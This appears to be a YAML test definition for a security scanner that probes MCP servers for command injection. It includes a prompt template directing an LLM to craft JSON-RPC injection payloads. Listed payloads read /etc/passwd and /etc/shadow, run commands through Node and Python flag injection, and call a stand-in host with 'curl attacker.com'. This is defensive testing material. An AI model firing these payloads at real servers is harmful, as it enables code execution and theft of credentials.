---
schema_version: 1
id: command-injection
name: Command Injection and STDIO RCE
severity: critical
owasp: MCP05
mcp_top_10: MCP05
description: >-
  Tests whether MCP server tool arguments are passed to shell commands, exec calls, or script
  runners without sanitization. This is the STDIO RCE class of vulnerability — a systemic
  design issue in MCP's execution model where unsanitized string arguments flow directly into
  system calls. Attackers inject shell metacharacters, command separators, or flag-based bypasses
  to achieve arbitrary code execution with the server process's privileges.
pass_criteria: |-
  - Shell metacharacters in arguments are sanitized or rejected before execution
  - Arguments are passed as structured data to processes, never interpolated into shell strings
  - No command output (file contents, user listings, system info) appears in tool responses
  - Server returns a validation error for inputs containing shell metacharacters
  - Flag-based bypasses (--rcfile, -c, --eval) are blocked or stripped
fail_criteria: |-
  - Response contains output consistent with command execution (file contents, whoami output, etc.)
  - Response contains /etc/passwd, /etc/hosts, or other system file contents
  - Response contains the output of injected shell commands (ip addr, uname, env, etc.)
  - Server accepts and processes arguments containing shell metacharacters without error
  - Error messages reveal that a shell was invoked with the attacker's payload
judge_needs_llm: true
applies_to_all_tools: true
patterns:
  - name: Shell Metacharacter Injection
    template: |-
      You are a security researcher testing an MCP server for command injection and STDIO RCE (MCP05).

      ATTACK BACKGROUND:
      MCP's STDIO transport allows servers to spawn local processes. Many MCP servers also call
      shell commands internally to implement their tools. When string arguments are interpolated
      into shell commands without sanitization, attackers can inject arbitrary OS commands.

      This is NOT just a coding bug — Anthropic confirmed the STDIO execution model is by design,
      and sanitization is left to developers. As a result, many real MCP servers are vulnerable.

      ATTACK TECHNIQUES:
      1. Command separators: "; id", "| whoami", "& net user", "; cat /etc/passwd"
      2. Command substitution: "$(whoami)", "`id`", "$(cat /etc/shadow)"
      3. Flag injection for common runtimes:
         - Node/npx: "-e 'require(\"child_process\").execSync(\"id\")'"
         - Python: "-c 'import os; os.system(\"id\")'"
         - npx bypass: "npx -c 'curl attacker.com'"
      4. Newline injection to break argument parsing: "\nmalicious_command\n"
      5. Null byte injection: "legitimate\x00; malicious"
      6. Path traversal combined with exec: "../../bin/sh -c id"

      AVAILABLE TOOLS (from tools/list):
      {{tool_list_json}}

      YOUR TASK:
      Look at each tool's parameter schema. For every tool that accepts string parameters
      (especially those named: command, script, code, path, file, query, args, input, exec,
      run, shell, cmd), generate an injection payload targeting that parameter. For tools with
      no obvious string exec parameters, still generate a probe — many servers pass all args
      through a shell wrapper.

      Choose the most dangerous injection for each tool based on what it appears to do:
      - File tools → path traversal + cat
      - Script/code tools → direct command execution
      - Query tools → subshell in query string
      - Generic tools → basic ; id or $(whoami) probe

      OUTPUT FORMAT — respond with a JSON array only, no other text:
      [
        {
          "tool_name": "<exact tool name>",
          "jsonrpc_payload": {
            "jsonrpc": "2.0",
            "method": "tools/call",
            "params": {
              "name": "<exact tool name>",
              "arguments": { "<most vulnerable param>": "<injection payload>" }
            },
            "id": 1
          },
          "judge_hint": "<Describe what command output would look like in this response. E.g. 'If injected, response will contain uid=0(root) or a list of /etc/passwd lines. Any system username, uid, or file content not matching the tool's expected output is a FAIL.'>"
        }
      ]

      Generate one entry per tool. Pick the most injection-prone parameter for each.
---
